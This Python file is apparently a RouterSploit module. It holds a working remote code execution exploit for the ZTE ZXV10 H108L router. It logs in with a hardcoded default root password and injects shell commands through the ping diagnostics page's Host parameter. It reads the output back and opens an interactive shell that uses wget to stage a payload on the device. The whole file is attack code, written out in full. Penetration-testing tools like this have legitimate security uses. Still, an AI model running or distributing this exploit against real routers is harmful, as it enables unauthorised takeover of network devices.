import re
import time
import requests
from routersploit.core.exploit import *
from routersploit.core.http.http_client import HTTPClient


class Exploit(HTTPClient):
    __info__ = {
        "name": "ZTE ZXV10 RCE",
        "description": "Exploits ZTE ZXV10 H108L remote code execution vulnerability "
                       "that allows executing commands on operating system level.",
        "authors": (
            "Anastasios Stasinopoulos",  # vulnerability discovery
            "Marcin Bury <marcin[at]threat9.com>",  # routersploit module
        ),
        "references": (
            "https://github.com/stasinopoulos/ZTExploit/",
        ),
        "devices": (
            "ZTE ZXV10 H108L",
        ),
    }

    target = OptIP("", "Target IPv4 or IPv6 address")
    port = OptPort(80, "Target HTTP port")

    username = OptString("root", "Username to log in with")
    password = OptString("W!n0&oO7.", "Password to log in with")

    def __init__(self):
        self.session = requests.Session()

    def run(self):
        if self.login():
            print_success("Target seems to be vulnerable")
            self.info()

            print_status("Invoking command loop")
            shell(self, architecture="mipsbe", method="wget", location="/tmp")
        else:
            print_error("Exploit failed - target seems to be not vulnerable")

    def execute(self, cmd):
        path = "/getpage.gch?pid=1002&nextpage=manager_dev_ping_t.gch&Host=;echo $({})&NumofRepeat=1&" \
               "DataBlockSize=64&DiagnosticsState=Requested&IF_ACTION=new&IF_IDLE=submit".format(cmd)

        try:
            response = self.http_request(
                method="GET",
                path=path,
                session=self.session
            )
            time.sleep(3)

            response = self.http_request(
                method="GET",
                path="/getpage.gch?pid=1002&nextpage=manager_dev_ping_t.gch",
                session=self.session
            )
            time.sleep(1)

            res = re.findall(r'textarea_1">(.*) -c', response.text)
            if len(res):
                return res[0]
            else:
                res1 = re.findall(r'textarea_1">(.*)', response.text)
                if res1[0] == "-c 1 -s 64":
                    return ""
                else:
                    res2 = re.findall(r'(.*) -c', response.text)
                    res = res1 + res2
                    if res[0] != "</textarea>":
                        return res[0]
        except Exception:
            pass

        return ""

    def info(self):
        try:
            response = self.http_request(
                method="GET",
                path="/template.gch",
                session=self.session
            )
        except Exception:
            return

        # Check for Model Name
        Frm_ModelName = re.findall(r'Frm_ModelName" class="tdright">(.*)<', response.text)
        if len(Frm_ModelName):
            print_status("Model Name: {}".format(Frm_ModelName[0]))

        # Check for Serial Number
        Frm_SerialNumber = re.findall(r'Frm_SerialNumber" class="tdright">(.*)', response.text)
        if len(Frm_SerialNumber):
            print_status("Serial Number: {}".format(Frm_SerialNumber[0]))

        # Check for Hardware Version
        Frm_HardwareVer = re.findall(r'Frm_HardwareVer" class="tdright">(.*)<', response.text)
        if len(Frm_HardwareVer):
            print_status("Software Version: {}".format(Frm_HardwareVer[0]))

        # Check for Boot Loader Version
        Frm_BootVer = re.findall(r'Frm_BootVer"  class="tdright">(.*)<', response.text)
        if len(Frm_BootVer):
            print_status("Boot Loader Version: {}".format(Frm_BootVer[0]))

    def login(self):
        try:
            response = self.http_request(
                method="GET",
                path="/",
                session=self.session
            )
            if response is None:
                return

            print_status("Retrieving random login token...")
            Frm_Logintoken = re.findall(r'Frm_Logintoken"\).value = "(.*)";', response.text)

            if len(Frm_Logintoken):
                Frm_Logintoken = Frm_Logintoken[0]
                print_status("Trying to log in with credentials {} : {}".format(self.username, self.password))

                data = {
                    "Frm_Logintoken": Frm_Logintoken,
                    "Username": self.username,
                    "Password": self.password
                }

                response = self.http_request(
                    method="POST",
                    path="/login.gch",
                    session=self.session,
                    data=data
                )
                if ("Username" not in response.text and "Password" not in response.text and
                   "404 Not Found" not in response.text and response.status_code != 404):
                    print_success("Successful authentication")
                    return True
        except Exception:
            pass

        return False

    @mute
    def check(self):
        if self.login():
            return True  # target is vulnerable

        return False  # target is not vulnerable
